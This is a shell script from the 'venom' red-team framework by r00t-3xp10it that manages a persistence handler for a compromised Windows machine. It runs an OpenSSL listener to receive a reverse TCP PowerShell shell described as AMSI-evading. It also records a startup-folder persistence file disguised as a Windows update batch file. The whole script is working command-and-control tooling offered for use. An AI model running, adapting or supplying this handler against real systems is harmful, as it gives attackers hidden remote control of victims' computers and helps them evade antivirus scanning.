#!/bin/sh
# Script version: v1.0
# Author: r00t-3xp10it (SSA RedTeam)
# Description: This Persistence handler script will store venom framework
# persistence handler settings/certificates in an compressed file (zip).
###


## Variable declarations
# venom.sh will config this settings
ID='@NULL'
RPATH='@NULL'
LPORT='@NULL'
LHOST='@NULL'
DOMAIN='@NULL'
CLIENT='@NULL'
DROPPER='@NULL'
LAST_ACCESS='@NULL'
FIRST_ACCESS='@NULL'


## Colorise shell Script output leters
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
  RedBg="${Escape}[1;3;7;31m";
  CyanBg="${Escape}[1;3;7;36m";
  GreenBg="${Escape}[1;3;7;32m";
Reset="${Escape}[0m";
}
Colors;


## Check for handler dependencies
if ! [ -e "cert.pem" ] || ! [ -e "key.pem" ]; then
   echo ${RedF}"[ERROR] Certificates not found in current directory .."
   sleep 2 && exit
fi
zen=$(which openssl)
if ! [ "$?" -eq "0" ]; then
   echo ${RedF}"[ERROR] OpenSSL not found in current system .."
   sleep 2 && exit
fi
service apache2 start

## Persistence Info Function
sh_Info () {
echo ""${BlueF}
echo "    Id          : $ID"
echo "    LPORT       : $LPORT"
echo "    LHOST       : $LHOST"
echo "    CN DOMAIN   : $DOMAIN"
echo "    CERTIFICATES: cert.pem + key.pem"
echo "    ACTIVE ON   : ${RedBg}$FIRST_ACCESS${Reset}${BlueF}"
echo "    LAST ACCESS : ${CyanBg}$LAST_ACCESS${Reset}${BlueF}"
echo "    DROPPERNAME : $DROPPER"
echo "    CATEGORIE   : Amsi Evasion (agent nº2)"
echo "    DESCRIPTION : Reverse TCP OpenSSL PS Shell"
echo "    AGENT RPATH : $RPATH"
echo "    PERSISTENCE : %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$ID.update.bat"
echo "" && echo ${RedF}:${BlueF}Press ${YellowF}"'ENTER'"${BlueF} to continue ..${Reset}
read op
cls
}


## Persistence Start handler Function
sh_Start () {
echo "${YellowF}Waiting for ${BlueF}TCP${YellowF} connection ..";sleep 1
gnome-terminal --title="OPENSSL LISTENER => $LHOST:$LPORT" --geometry=90x21 --wait -- sh -c "echo Domain-Name : $DOMAIN;echo Certficates : key.pem + cert.pem;echo Listening on: $LHOST:$LPORT;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $LPORT" > /dev/null 2>&1

## Config this handler settings
dtr=$(date|awk {'print $2,$3,$4,$5'})
LAST=$(cat handler.sh | egrep -m 1 "LAST_ACCESS") > /dev/null 2>&1
sed -i "s|$LAST|LAST_ACCESS='$dtr'|" handler.sh
cls
}


## Persistence Certificates (SSL) Function
sh_Certs () {
echo "${YellowF}Editing cert.pem certificate."${Reset};sleep 1
echo ""
openssl x509 -in cert.pem -noout -text
echo "" && echo ${RedF}:${BlueF}Press ${YellowF}"'ENTER'"${BlueF} to continue ..${Reset};
read op
cls
}


## handler.sh exit Function
sh_Exit () {
echo ${YellowF}"Compressing (zip) handler files ..";sleep 2
## zip handler files (settings/certificates)
zip handler_ID:$ID.zip handler.sh cert.pem key.pem README -m -q
## exit
exit
}




## MAIN MENU SHELLCODE GENERATOR
# Loop forever menu Function
while :
do
clear && echo ${BlueF}
cat << !
    __    _ ______  ____   _  _____  ____    __
   \  \  //|   ___||    \ | |/     \|    \  /  |
    \  \// |   ___||     \| ||     ||     \/   |
     \__/  |______||__/\____|\_____/|__/\__/|__|
            'Persistence handler script'


!
echo "${YellowF}    Id      ActiveOn               LocalHost"${BlueF};
echo "${BlueF}    ----    ------------           -------------"${BlueF};
echo "${RedF}    $ID${BlueF}     $FIRST_ACCESS   $LHOST:$LPORT"${BlueF};
echo "" && echo "${YellowF}    Commands    Description"${BlueF};
cat << !
    --------    -----------
    Info        Detail information about this handler
    Start       Start this stored handler (Listenner)
    Certs       Review Server/Client certificates (SSL)
    Exit        Exit this stored handler and zip files.


!

echo -n ${RedF}":${BlueF}Handler> "${Reset}
read choice
case $choice in
Info|info|INFO) sh_Info ;;
Start|start|START) sh_Start ;;
Certs|certs|CERTS) sh_Certs ;;
Exit|exit|EXIT) sh_Exit ;;
*) echo ${RedF}[x] "[$choice]"${white}: is not a valid Command${Reset}; sleep 2 ;;
esac
done
